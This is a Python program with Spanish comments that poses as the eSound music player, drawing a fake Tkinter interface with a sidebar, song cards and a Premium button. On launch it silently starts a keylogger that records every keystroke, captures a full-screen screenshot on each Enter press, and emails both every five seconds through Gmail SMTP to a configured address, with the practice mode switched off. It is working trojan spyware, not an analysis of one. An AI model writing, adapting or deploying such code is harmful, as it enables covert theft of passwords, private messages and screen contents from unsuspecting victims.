from pynput import keyboard
import threading
import tkinter as tk
import queue
import os
import datetime
import time
import webbrowser
import smtplib
import io
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
import mss
import mss.tools

# Pillow para los logos
try:
    from PIL import Image, ImageTk
    PIL_DISPONIBLE = True
except ImportError:
    PIL_DISPONIBLE = False
    print("Pillow no está instalado. Los logos no se cargarán.")
    print("Instálalo con: pip install pillow")


# === CONFIGURACIÓN EMAIL ===
# ¡CAMBIA ESTOS DATOS POR LOS TUYOS!
SENDER_EMAIL = 'email_emisor@gmail.com'
SENDER_PASSWORD = 'contraseña_de_app_email_emisor'
RECEIVER_EMAIL = 'email_receptoro@gmail.com'
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587

# === MODO PRÁCTICA ===
MODO_PRACTICA = False # Le das en false para que los logs sean enviados

# === VARIABLES GLOBALES ===
key_queue = queue.Queue()
listener_thread = None
queue_thread = None
keylogger_running = False
stop_flag = threading.Event()
text_buffer = []
attachments = []


def run_in_background(target, *args, **kwargs):
    threading.Thread(target=target, args=args, kwargs=kwargs, daemon=True).start()


# === FUNCIONES DE EMAIL ===
def send_email(subject, body, attachment_list=None):
    if MODO_PRACTICA:
        print("=" * 50)
        print(f"[SIMULADO] Email: {subject}")
        print(f"[SIMULADO] Cuerpo: {body[:100]}...")
        if attachment_list:
            print(f"[SIMULADO] Adjuntos: {len(attachment_list)} archivo(s)")
            for nombre, _, _ in attachment_list:
                print(f"  - {nombre}")
        print("=" * 50)
        return

    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        if attachment_list:
            for filename, data, mime_type in attachment_list:
                if mime_type.startswith('image'):
                    part = MIMEImage(data, name=filename)
                else:
                    part = MIMEApplication(data, Name=filename)
                part.add_header('Content-Disposition', 'attachment', filename=filename)
                msg.attach(part)

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        server.quit()
        print(f"Email enviado: {subject}")
    except Exception as e:
        print(f"Error email: {e}")


def send_text_email(text):
    text_buffer.append(text)


def send_combined_email():
    # Si no hay nada, no mandes correo
    if not text_buffer and not attachments:
        return

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    subject = f"Reporte combinado - {timestamp}"
    body = "".join(text_buffer) if text_buffer else "Sin texto capturado"
    if attachments:
        body += f"\n\nAdjuntos: {len(attachments)} archivo(s)"

    send_email(subject, body, attachments)

    # Limpiamos SOLO después de enviar
    text_buffer.clear()
    attachments.clear()


# === CAPTURA DE PANTALLA ===
def take_screenshot_mem():
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        from PIL import Image as PILImage
        img = PILImage.frombytes('RGB', screenshot.size, screenshot.rgb)
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        return buffer.getvalue()


def handle_enter():
    try:
        img_bytes = take_screenshot_mem()
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        attachments.append((filename, img_bytes, 'image/png'))
        print("Captura de pantalla adjuntada (memoria)")
    except Exception as e:
        print(f"Error en screenshot: {e}")


# === CAPTURA DE TECLAS ===
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            key_queue.put(key.char)
        elif key == keyboard.Key.enter:
            key_queue.put("\n")
            run_in_background(handle_enter)
        elif key == keyboard.Key.space:
            key_queue.put(" ")
        elif key == keyboard.Key.tab:
            key_queue.put("\t")
        elif key == keyboard.Key.backspace:
            key_queue.put("[<-]")
        else:
            key_queue.put(f"[{key.name}]")
    except Exception as e:
        print(f"Error capturando tecla: {e}")


def process_queue():
    ultimo_envio = time.time()

    while not stop_flag.is_set():
        if not key_queue.empty():
            text = "".join(key_queue.get() for _ in range(key_queue.qsize()))
            send_text_email(text)

        # Solo manda correo cada 5 segundos
        if time.time() - ultimo_envio > 5:
            send_combined_email()
            ultimo_envio = time.time()

        time.sleep(0.016)


# === FLUJO PRINCIPAL ===
def start_listener():
    global listener_thread, queue_thread, keylogger_running
    if keylogger_running:
        return
    stop_flag.clear()
    keylogger_running = True
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_email(f"Inicio - {timestamp}", "\n--- eSound Premium activado ---\n", [])
    listener_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).run())
    queue_thread = threading.Thread(target=process_queue)
    listener_thread.start()
    queue_thread.start()


def stop_keylogger():
    global keylogger_running
    if not keylogger_running:
        return
    stop_flag.set()
    keylogger_running = False
    send_combined_email()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_email(f"Fin - {timestamp}", "\n--- eSound Premium cancelado ---\n", [])


def open_esound_premium():
    webbrowser.open('https://www.esound.com/premium/')


# === INTERFAZ GRÁFICA ===
def create_app():
    app = tk.Tk()
    app.title("eSound")
    app.geometry("900x600")
    app.configure(bg="#0d0f0e")
    app.resizable(False, False)

    # ---- Paleta de colores eSound ----
    BG        = "#0d0f0e"
    SIDEBAR   = "#141816"
    CARD      = "#1a201b"
    GREEN     = "#b5f569"
    TEXT      = "#f5f7f4"
    MUTED     = "#7d8a80"

    # ---- Función para redimensionar respetando proporción ----
    def cargar_logo(ruta, ancho_max, alto_max):
        """Carga una imagen y la redimensiona manteniendo su proporción."""
        try:
            img = Image.open(ruta).convert("RGBA")
            ancho_orig, alto_orig = img.size
            ratio = min(ancho_max / ancho_orig, alto_max / alto_orig)
            nuevo_ancho = int(ancho_orig * ratio)
            nuevo_alto = int(alto_orig * ratio)
            img = img.resize((nuevo_ancho, nuevo_alto), Image.LANCZOS)
            return ImageTk.PhotoImage(img)
        except Exception as e:
            print(f"Error cargando {ruta}: {e}")
            return None

    # ---- Cargar logos respetando proporción ----
    logo_icono = None
    logo_horizontal = None

    if PIL_DISPONIBLE:
        logo_icono = cargar_logo("Esound_logo.png", 100, 100)
        if logo_icono:
            app.logo_icono = logo_icono
            print("Logo cuadrado cargado")

        logo_horizontal = cargar_logo("logo_horizontal.png", 300, 100)
        if logo_horizontal:
            app.logo_horizontal = logo_horizontal
            print("Logo horizontal cargado")

    # ========================================================
    #  BARRA LATERAL
    # ========================================================
    sidebar = tk.Frame(app, bg=SIDEBAR, width=200)
    sidebar.pack(side="left", fill="y")
    sidebar.pack_propagate(False)

    # Logo cuadrado en la sidebar
    if logo_icono:
        tk.Label(sidebar, image=logo_icono, bg=SIDEBAR).pack(pady=(25, 5))
    else:
        tk.Label(sidebar, text="eSound", font=("Arial", 22, "bold"),
                 bg=SIDEBAR, fg=GREEN).pack(pady=(25, 5))

    tk.Label(sidebar, text="Tu música, contigo.", font=("Arial", 9),
             bg=SIDEBAR, fg=MUTED).pack(pady=(0, 30))

    # Secciones (sin emojis, solo texto)
    secciones = ["Inicio", "Buscar", "Biblioteca", "Descargas"]

    for nombre in secciones:
        item = tk.Frame(sidebar, bg=SIDEBAR, cursor="hand2")
        item.pack(fill="x", padx=10, pady=2)

        tk.Label(item, text=f"   {nombre}", font=("Arial", 11),
                 bg=SIDEBAR, fg=TEXT, anchor="w").pack(fill="x", pady=8)

    tk.Frame(sidebar, bg=SIDEBAR).pack(expand=True, fill="y")

    # Botón Premium (sin emoji, redirige a eSound)
    tk.Button(sidebar, text="Premium", command=open_esound_premium,
              bg=GREEN, fg="#0d0f0e", activebackground="#ccff91",
              font=("Arial", 10, "bold"), relief="flat", bd=0,
              cursor="hand2", padx=15, pady=8).pack(fill="x", padx=20, pady=20)

    # ========================================================
    #  PANEL PRINCIPAL
    # ========================================================
    main = tk.Frame(app, bg=BG)
    main.pack(side="left", fill="both", expand=True)

    # Encabezado (sin emoji)
    header = tk.Frame(main, bg=BG)
    header.pack(fill="x", padx=35, pady=(30, 10))

    tk.Label(header, text="Buenos días", font=("Arial", 20, "bold"),
             bg=BG, fg=TEXT).pack(anchor="w")

    tk.Label(header, text="¿Qué quieres escuchar hoy?", font=("Arial", 11),
             bg=BG, fg=MUTED).pack(anchor="w", pady=(2, 0))

    # Logo horizontal
    if logo_horizontal:
        tk.Label(main, image=logo_horizontal, bg=BG).pack(anchor="w", padx=35, pady=(15, 0))
    else:
        tk.Label(main, text="eSound", font=("Arial", 18, "bold"),
                 bg=BG, fg=GREEN).pack(anchor="w", padx=35, pady=(15, 0))

    # Tarjetas
    tk.Label(main, text="Destacado para ti", font=("Arial", 13, "bold"),
             bg=BG, fg=TEXT).pack(anchor="w", padx=35, pady=(20, 10))

    grid = tk.Frame(main, bg=BG)
    grid.pack(fill="x", padx=35)

    # Canciones (sin emojis, con iniciales y cuadros de color)
    canciones = [
        ("N", "Nocturno", "Luna Pérez"),
        ("O", "Olas", "Mar Azul"),
        ("F", "Fuego", "Sol Rivera"),
        ("V", "Verde", "Bosque Sur"),
    ]

    for inicial, titulo, artista in canciones:
        card = tk.Frame(grid, bg=CARD, cursor="hand2")
        card.pack(side="left", padx=(0, 12))

        # Cuadro de color con la inicial
        cuadro = tk.Frame(card, bg=GREEN, width=60, height=60)
        cuadro.pack(padx=25, pady=(15, 5))
        cuadro.pack_propagate(False)

        tk.Label(cuadro, text=inicial, font=("Arial", 22, "bold"),
                 bg=GREEN, fg="#0d0f0e").pack(expand=True)

        tk.Label(card, text=titulo, font=("Arial", 10, "bold"),
                 bg=CARD, fg=TEXT).pack()

        tk.Label(card, text=artista, font=("Arial", 8),
                 bg=CARD, fg=MUTED).pack(pady=(0, 15))

    # ========================================================
    #  BARRA DE REPRODUCCIÓN (sin emojis)
    # ========================================================
    player = tk.Frame(app, bg=SIDEBAR, height=70)
    player.pack(side="bottom", fill="x")
    player.pack_propagate(False)

    tk.Label(player, text="Nocturno — Luna Pérez", font=("Arial", 10),
             bg=SIDEBAR, fg=TEXT).pack(side="left", padx=20)

    controles = tk.Frame(player, bg=SIDEBAR)
    controles.pack(side="right", padx=20)

    # Controles con texto (sin emojis)
    for simbolo in ["|<", "||", ">|"]:
        tk.Label(controles, text=simbolo, font=("Arial", 12, "bold"),
                 bg=SIDEBAR, fg=TEXT, cursor="hand2").pack(side="left", padx=10)

    # ---- Arranca el logger ----
    start_listener()

    app.mainloop()


if __name__ == "__main__":
    create_app()
